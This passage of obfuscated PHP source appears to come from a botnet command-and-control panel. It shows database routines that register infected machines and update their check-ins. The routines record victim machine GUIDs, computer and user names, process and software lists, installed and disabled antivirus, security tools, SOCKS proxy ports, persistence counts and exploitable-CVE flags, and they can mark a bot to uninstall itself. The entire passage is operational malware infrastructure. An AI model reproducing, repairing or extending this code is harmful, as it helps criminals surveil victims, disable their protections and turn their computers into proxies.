        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D06192737381C2F14170A312D383D3B08270502292311_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D1C1D01351B29192F0D0C121230401C2F162F1F023C11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D1F131E2D041E2A25361925351F3C340839190A250D01_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D30343413233213213F385C041B092D11023E3E403E32_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D1E3232270E25241C35133B1F041F150D190A5C343101_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D0C241E3714230321273F29233736091D143C053D2D32_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D3C1717322703291D05251B3421170A380A09250B3322_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D21321F24120A2114263523380D120410043202152A01_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNIX_TIMESTAMP(NOW()), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNIX_TIMESTAMP(NOW()), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "0, ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D070B2B042A285B3936140B28400D1F2838221A0E2F32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0C32402C40033C09291E180E3C1F16161F03063C0411_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0C1F18101E06312E170F061E243F2E323B033F335C01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0E2F0E09133D292A3E3D1D37101F14141A1004350832_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D010E0D18210934042F02130508361B035B3E1B303901_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D342640382D5C3D213F19370832031A103D2F21090422_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D331606303D213632133E110E3F230F263E0932301F22_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D04063F0317122C2A243B2C0F1F0F033C2C05101C0632_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D1B2E22185B1419223E075C26080D130A5C2732292511_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D5B372F1E0C1E0D0B241E3C14031D362E0603322A1E32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D043B2C241C0C031A5C2D332834262F240D2C17113F32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D1B0B3D1B133813341C1D013F233536260D2D32040701_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "0, ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "0, ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "0, ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D1911380D220B2A3C1A16300E29060D2133332F343E01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D130F3D4005110415231436340F2B3D5B033D06372B22_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D1F2522400E0607212314050121121F2814080E051F32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D355B15342721301A1C3C1229291106212B022A011222_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D27223F23353523220F5C312A293E5C0F091E3F371601_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0B26162C2C5C5C22320E32254025251B3F3906392A11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D5B0F2B1E1E1B2D5C190D27331C373E140E3531013511_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D16372422250B0517253B04252835312F35270A0E2832_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D1D01022A2F031F221C031F0D1F15115C313102232A01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0913042D08361E0A1E040D10082C4013183E15193522_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D28343637013B3018121336310A3C1B11371B101E0622_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D2B103B34095B26270E29382D073E1232283410152222_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D36101D042C172A0A2A252D101310395C30135B5C2E32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D175B211C10292728223C2237091C36331D4016400222_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0206380C071F2F0238250E302B3D3B39162E06230311_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D245B162F24031C2A1F340305172337382E110B293311_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D250F4008071819333E1C182A04352D2C052F081A1632_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= (string) $_obfuscated_0D0A1E123F402F1C3212081924082B170A323609290D32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "0xFFFFFFFFFFFFFFFF, ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UNHEX('" . $_obfuscated_0D3506032A5B1B231C240A022C350407185B2D06343822_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "'', ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "''";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= ")";
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query($_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_);
        return @mysql_insert_id();
    }
    public function DeleteClient($botClientEx = NULL)
    {
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ = "DELETE FROM " . $this->pdbname . ".clients WHERE ";
        if (isset($this->Bot_RecordID) && 0 <= $this->Bot_RecordID) {
            $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "id = '" . $this->Bot_RecordID . "'";
        } else {
            if (isset($this->Machine_GUID) && 0 <= strlen($this->Machine_GUID) && strlen($this->Machine_GUID) % 2 == 0) {
                $_obfuscated_0D06192737381C2F14170A312D383D3B08270502292311_ = bin2hex($this->Machine_GUID);
                $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "GUID = UNHEX('" . $_obfuscated_0D06192737381C2F14170A312D383D3B08270502292311_ . "')";
            } else {
                return NULL;
            }
        }
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= " LIMIT 1";
        return parent::Query($_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_);
    }
    public function SetClientAsDeleted($bot_id)
    {
        $_obfuscated_0D253F372F092F23092924405C2901010F1305382F3132_ = (int) $bot_id;
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".clients SET ClientStatus = '" . BOT_STATUS_DELETED . "', ClientAttributes = '" . __BOT_DISPOSITION_UNINSTALL_SELF . "' WHERE id = '" . $_obfuscated_0D253F372F092F23092924405C2901010F1305382F3132_ . "' LIMIT 1");
        return $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_;
    }
    public function UpdateClient_CheckIn($botClientEx, $bot_last_task_id_performed, $bot_request_type)
    {
        if (!isset($botClientEx) || !isset($_SERVER["REMOTE_ADDR"])) {
            return NULL;
        }
        $_obfuscated_0D1F3B3E1B401B2B0E5B172332113632152D1B3B021211_ = $botClientEx->Bot_Attributes;
        $_obfuscated_0D323F5B231330181F0B091E0A13171C15053F24275C11_ = $botClientEx->Bot_RecordAttributes;
        if ($_obfuscated_0D1F3B3E1B401B2B0E5B172332113632152D1B3B021211_ & BOT_ATTRIBUTE_IS_VIRTUAL_MACHINE) {
            if (!($_obfuscated_0D323F5B231330181F0B091E0A13171C15053F24275C11_ & BOT_RECORD_IS_VIRTUAL_MACHINE)) {
                $_obfuscated_0D323F5B231330181F0B091E0A13171C15053F24275C11_ |= BOT_RECORD_IS_VIRTUAL_MACHINE;
            }
            $_obfuscated_0D1F3B3E1B401B2B0E5B172332113632152D1B3B021211_ &= ~BOT_ATTRIBUTE_IS_VIRTUAL_MACHINE;
        }
        $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ = "";
        $_obfuscated_0D345B3339405C2A0723163406383C233B260D23282101_ = sprintf("%u", ip2long($_SERVER["REMOTE_ADDR"]));
        $_obfuscated_0D3B370E37173207052A3B3409321C2B390C38292C2232_ = @bin2hex($botClientEx->Bot_Locale);
        $_obfuscated_0D312D2F5B37310D3D2F3825401516400D14380E011701_ = @bin2hex($botClientEx->Bot_LocaleName);
        $_obfuscated_0D2901030132053418261017252B0E1B341C313E023001_ = sprintf("%u", $botClientEx->Bot_RecordID);
        $_obfuscated_0D1C1D01351B29192F0D0C121230401C2F162F1F023C11_ = sprintf("%u", $botClientEx->Bot_Version);
        $_obfuscated_0D331606303D213632133E110E3F230F263E0932301F22_ = sprintf("%u", $botClientEx->Bot_OS);
        $_obfuscated_0D5B372F1E0C1E0D0B241E3C14031D362E0603322A1E32_ = sprintf("%u", $botClientEx->Bot_Time_Current);
        $_obfuscated_0D3506032A5B1B231C240A022C350407185B2D06343822_ = "";
        $_obfuscated_0D1F2522400E0607212314050121121F2814080E051F32_ = sprintf("%u", $_obfuscated_0D1F3B3E1B401B2B0E5B172332113632152D1B3B021211_);
        $_obfuscated_0D1D01022A2F031F221C031F0D1F15115C313102232A01_ = sprintf("%u", $botClientEx->Software_Installed);
        $_obfuscated_0D0C01404009041228133B261E34091933013E0F5C3901_ = sprintf("%u", $botClientEx->SecurityTools_Installed);
        $_obfuscated_0D0B26162C2C5C5C22320E32254025251B3F3906392A11_ = sprintf("%u", $botClientEx->Avs_Installed);
        $_obfuscated_0D5B0F2B1E1E1B2D5C190D27331C373E140E3531013511_ = sprintf("%u", $botClientEx->Avs_Killed);
        $_obfuscated_0D0206380C071F2F0238250E302B3D3B39162E06230311_ = sprintf("%u", $botClientEx->WebAttributes);
        $_obfuscated_0D245B162F24031C2A1F340305172337382E110B293311_ = sprintf("%u", $botClientEx->DebugAttributes);
        $_obfuscated_0D250F4008071819333E1C182A04352D2C052F081A1632_ = sprintf("%u", $botClientEx->CveAttributes);
        $_obfuscated_0D0A1E123F402F1C3212081924082B170A323609290D32_ = sprintf("%u", $botClientEx->PrimaryResolution);
        $_obfuscated_0D0C5C2F24113F131B0124355B1815013B23233D290222_ = sprintf("%u", $_obfuscated_0D323F5B231330181F0B091E0A13171C15053F24275C11_);
        $_obfuscated_0D070B2B042A285B3936140B28400D1F2838221A0E2F32_ = sprintf("%u", $botClientEx->ConfigVer_DNS_Blocklist);
        $_obfuscated_0D0C32402C40033C09291E180E3C1F16161F03063C0411_ = sprintf("%u", $botClientEx->ConfigVer_URL_Tracklist);
        $_obfuscated_0D0C1F18101E06312E170F061E243F2E323B033F335C01_ = sprintf("%u", $botClientEx->ConfigVer_DynamicConfig);
        $_obfuscated_0D0E2F0E09133D292A3E3D1D37101F14141A1004350832_ = sprintf("%u", $botClientEx->ConfigVer_FileSearch);
        $_obfuscated_0D010E0D18210934042F02130508361B035B3E1B303901_ = sprintf("%u", $botClientEx->ConfigVer_Plugins);
        $_obfuscated_0D342640382D5C3D213F19370832031A103D2F21090422_ = sprintf("%u", $botClientEx->ConfigVer_Web);
        $_obfuscated_0D3506032A5B1B231C240A022C350407185B2D06343822_ = bin2hex("default");
        $_obfuscated_0D3C1717322703291D05251B3421170A380A09250B3322_ = bin2hex(_obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($botClientEx->HostProcessName));
        if ($bot_request_type == BOT_REQUEST_TYPE_SYSTEM_BOOT_CHECKIN) {
            $_obfuscated_0D1037073B08225C331826031C07121B271B1A23131701_ = "";
            $_obfuscated_0D212326022711312E0B40101E0B2E0F0E3B3932325C11_ = "";
            $_obfuscated_0D31300B21112224341623313033273E3D1F4036093F01_ = "";
            $_obfuscated_0D2305030F40350122242A0E40294021345C0D07243C32_ = "";
            $_obfuscated_0D130D0D2A3C012E2D3C060106330A374031093B2E3322_ = "";
            $_obfuscated_0D290C09012C0A18021D035C3C3B032139192F36031732_ = "";
            if (strlen($botClientEx->Bot_DefaultBrowser)) {
                $_obfuscated_0D1037073B08225C331826031C07121B271B1A23131701_ = bin2hex($botClientEx->Bot_DefaultBrowser);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "DefaultBrowser=UNHEX('" . $_obfuscated_0D1037073B08225C331826031C07121B271B1A23131701_ . "'), ";
            }
            if (strlen($botClientEx->Bot_CpuName)) {
                $_obfuscated_0D212326022711312E0B40101E0B2E0F0E3B3932325C11_ = bin2hex($botClientEx->Bot_CpuName);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "CpuName=UNHEX('" . $_obfuscated_0D212326022711312E0B40101E0B2E0F0E3B3932325C11_ . "'), ";
            }
            if (strlen($botClientEx->Bot_VideoCardName)) {
                $_obfuscated_0D31300B21112224341623313033273E3D1F4036093F01_ = bin2hex($botClientEx->Bot_VideoCardName);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "VideoCardName=UNHEX('" . $_obfuscated_0D31300B21112224341623313033273E3D1F4036093F01_ . "'), ";
            }
            if (strlen($botClientEx->Bot_ProductId)) {
                $_obfuscated_0D2305030F40350122242A0E40294021345C0D07243C32_ = bin2hex($botClientEx->Bot_ProductId);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "ProductId=UNHEX('" . $_obfuscated_0D2305030F40350122242A0E40294021345C0D07243C32_ . "'), ";
            }
            if (strlen($botClientEx->Bot_Names)) {
                $_obfuscated_0D130D0D2A3C012E2D3C060106330A374031093B2E3322_ = bin2hex($botClientEx->Bot_Names);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "CompNameUsername=UNHEX('" . $_obfuscated_0D130D0D2A3C012E2D3C060106330A374031093B2E3322_ . "'), ";
            }
            if (strlen($botClientEx->Bot_InstallPath)) {
                $_obfuscated_0D290C09012C0A18021D035C3C3B032139192F36031732_ = bin2hex($botClientEx->Bot_InstallPath);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "InstallPath=UNHEX('" . $_obfuscated_0D290C09012C0A18021D035C3C3B032139192F36031732_ . "'), ";
            }
            if (strlen($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_)) {
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ = substr($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_, 0, strlen($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_) - 2);
            }
        } else {
            $_obfuscated_0D320F270B3F0F192A282B0E3312223B223E28263F1D32_ = "";
            $_obfuscated_0D3F0A340E0F2D343905402B27222A391C02271D222311_ = "";
            $_obfuscated_0D0C101303262724090D1F080F3B381A2F3937081E1C11_ = "";
            $_obfuscated_0D400211210C0E1A151339222232220D3B3B2537383622_ = "";
            $_obfuscated_0D0E023C01043E2B2C272F2A21292A28232D03210D2132_ = "";
            if (strlen($botClientEx->InfoBlob_ProcessList)) {
                $_obfuscated_0D320F270B3F0F192A282B0E3312223B223E28263F1D32_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($botClientEx->InfoBlob_ProcessList);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "InfoProcessList='" . $_obfuscated_0D320F270B3F0F192A282B0E3312223B223E28263F1D32_ . "', ";
            }
            if (strlen($botClientEx->InfoBlob_InstalledSoftwareList)) {
                $_obfuscated_0D3F0A340E0F2D343905402B27222A391C02271D222311_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($botClientEx->InfoBlob_InstalledSoftwareList);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "InfoSoftwareList='" . $_obfuscated_0D3F0A340E0F2D343905402B27222A391C02271D222311_ . "', ";
            }
            if (strlen($botClientEx->InfoBlob_AutostartList)) {
                $_obfuscated_0D0C101303262724090D1F080F3B381A2F3937081E1C11_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($botClientEx->InfoBlob_AutostartList);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "InfoAutostartList='" . $_obfuscated_0D0C101303262724090D1F080F3B381A2F3937081E1C11_ . "', ";
            }
            if (strlen($botClientEx->InfoBlob_Generic)) {
                $_obfuscated_0D400211210C0E1A151339222232220D3B3B2537383622_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($botClientEx->InfoBlob_Generic);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "InfoGenericList='" . $_obfuscated_0D400211210C0E1A151339222232220D3B3B2537383622_ . "', ";
            }
            if (strlen($botClientEx->InfoBlob_Debug)) {
                $_obfuscated_0D0E023C01043E2B2C272F2A21292A28232D03210D2132_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($botClientEx->InfoBlob_Debug);
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ .= "InfoDebugList='" . $_obfuscated_0D0E023C01043E2B2C272F2A21292A28232D03210D2132_ . "', ";
            }
            if (strlen($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_)) {
                $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_ = substr($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_, 0, strlen($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_) - 2);
            }
        }
        if (isset($botClientEx->GroupName) && 0 < (int) @strlen($botClientEx->GroupName)) {
            $_obfuscated_0D3506032A5B1B231C240A022C350407185B2D06343822_ = bin2hex(_obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($botClientEx->GroupName));
        }
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ = "UPDATE " . $this->pdbname . ".clients SET ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "ClientStatus=" . BOT_STATUS_ONLINE . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "LastCheckIn=UNIX_TIMESTAMP(NOW()), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "Version=" . $_obfuscated_0D1C1D01351B29192F0D0C121230401C2F162F1F023C11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "OS=" . $_obfuscated_0D331606303D213632133E110E3F230F263E0932301F22_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "LastIP=" . $_obfuscated_0D345B3339405C2A0723163406383C233B260D23282101_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "DnsModify_Revision=" . $_obfuscated_0D070B2B042A285B3936140B28400D1F2838221A0E2F32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "UrlTrack_Revision=" . $_obfuscated_0D0C32402C40033C09291E180E3C1F16161F03063C0411_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "FileSearch_Revision=" . $_obfuscated_0D0E2F0E09133D292A3E3D1D37101F14141A1004350832_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "Web_Revision=" . $_obfuscated_0D342640382D5C3D213F19370832031A103D2F21090422_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "Locale=UNHEX('" . $_obfuscated_0D3B370E37173207052A3B3409321C2B390C38292C2232_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "LocaleName=UNHEX('" . $_obfuscated_0D312D2F5B37310D3D2F3825401516400D14380E011701_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "BotTime=" . $_obfuscated_0D5B372F1E0C1E0D0B241E3C14031D362E0603322A1E32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "SocksPort=" . $botClientEx->Bot_SocksPort . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "BotsKilled=" . $botClientEx->Bots_Killed . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "FileRestoreCount=" . $botClientEx->ExInfLow_PersistNumOfFileRestores . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "CrashRestartCount=" . $botClientEx->ExInfLow_NumOfCrashRestarts . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "ClientAttributes=" . $_obfuscated_0D1F2522400E0607212314050121121F2814080E051F32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "AvsInstalled=" . $_obfuscated_0D0B26162C2C5C5C22320E32254025251B3F3906392A11_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "AvsKilled=" . $_obfuscated_0D5B0F2B1E1E1B2D5C190D27331C373E140E3531013511_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "SoftwareInstalled=" . $_obfuscated_0D1D01022A2F031F221C031F0D1F15115C313102232A01_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "SecurityToolsInstalled=" . $_obfuscated_0D0C01404009041228133B261E34091933013E0F5C3901_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "excp_access_violation=" . $botClientEx->Exceptions_AccessViolation . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "excp_priv_instruction=" . $botClientEx->Exceptions_PrivInstruction . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "excp_illegal_instruction=" . $botClientEx->Exceptions_IllegalInstruction . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "excp_stack_overflow=" . $botClientEx->Exceptions_StackOverflow . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "excp_in_page_error=" . $botClientEx->Exceptions_InPageError . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "WebAttributes=" . $_obfuscated_0D0206380C071F2F0238250E302B3D3B39162E06230311_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "DebugAttributes=" . $_obfuscated_0D245B162F24031C2A1F340305172337382E110B293311_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "CveAttributes=" . $_obfuscated_0D250F4008071819333E1C182A04352D2C052F081A1632_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "PrimaryResolution=" . $_obfuscated_0D0A1E123F402F1C3212081924082B170A323609290D32_ . ", ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "RecordAttributes=(RecordAttributes | " . $_obfuscated_0D0C5C2F24113F131B0124355B1815013B23233D290222_ . "), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "HostProcessName=UNHEX('" . $_obfuscated_0D3C1717322703291D05251B3421170A380A09250B3322_ . "'), ";
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= "GroupName=UNHEX('" . $_obfuscated_0D3506032A5B1B231C240A022C350407185B2D06343822_ . "')";
        if (0 < strlen($_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_)) {
            $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= ", ";
            $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= $_obfuscated_0D380940301D401A0501230612273E32080B0A2F1C0F32_;
        }
        if ($bot_last_task_id_performed != 0) {
            $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= ", LastTask='" . $bot_last_task_id_performed . "'";
        }
        $_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_ .= " WHERE id = " . $_obfuscated_0D2901030132053418261017252B0E1B341C313E023001_ . " LIMIT 1";
        return parent::Query($_obfuscated_0D131B15383B34031F4030251E033D2E3D022C0D1A2E01_);
    }
    public function SetClient_Comment($client_id = 0, $new_comment = "")
    {
        $_obfuscated_0D0D2E3B01281A100709172C37133717092C3D09293D01_ = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($new_comment);
        return parent::Query("UPDATE " . $this->pdbname . ".clients SET Comments = '" . $_obfuscated_0D0D2E3B01281A100709172C37133717092C3D09293D01_ . "' WHERE id = '" . $client_id . "' LIMIT 1");
    }
    public function SetClient_Favorite($client_id, $is_favorite)
    {
        $_obfuscated_0D0E380D1E0C09212F12122A5B5B3117163F0634295B01_ = "";
        if ($is_favorite) {
            $_obfuscated_0D0E380D1E0C09212F12122A5B5B3117163F0634295B01_ = "RecordAttributes | " . (int) BOT_RECORD_IS_FAVORITE;
        } else {
            $_obfuscated_0D0E380D1E0C09212F12122A5B5B3117163F0634295B01_ = "RecordAttributes & ~" . (int) BOT_RECORD_IS_FAVORITE;
        }
        return parent::Query("UPDATE " . $this->pdbname . ".clients SET RecordAttributes = (" . $_obfuscated_0D0E380D1E0C09212F12122A5B5B3117163F0634295B01_ . ") WHERE id = '" . $client_id . "' LIMIT 1");
    }
    public function SetBotAsDirty($bot_id)
    {
        $bot_id = (int) $bot_id;
        return parent::Query("UPDATE " . $this->pdbname . ".clients SET RecordAttributes = (RecordAttributes | " . (int) BOT_RECORD_IS_DIRTY . ") WHERE id = '" . $bot_id . "' LIMIT 1");
    }
    public function SetAllBotsAsClean()
    {
        return parent::Query("UPDATE " . $this->pdbname . ".clients SET RecordAttributes = (RecordAttributes & ~" . (int) BOT_RECORD_IS_DIRTY . ") WHERE RecordAttributes & " . BOT_RECORD_IS_DIRTY);
    }
    public function GetClientByGUID($guid)
    {
        if (strlen($guid) == 0) {
            return NULL;
        }
        $guid = bin2hex($guid);
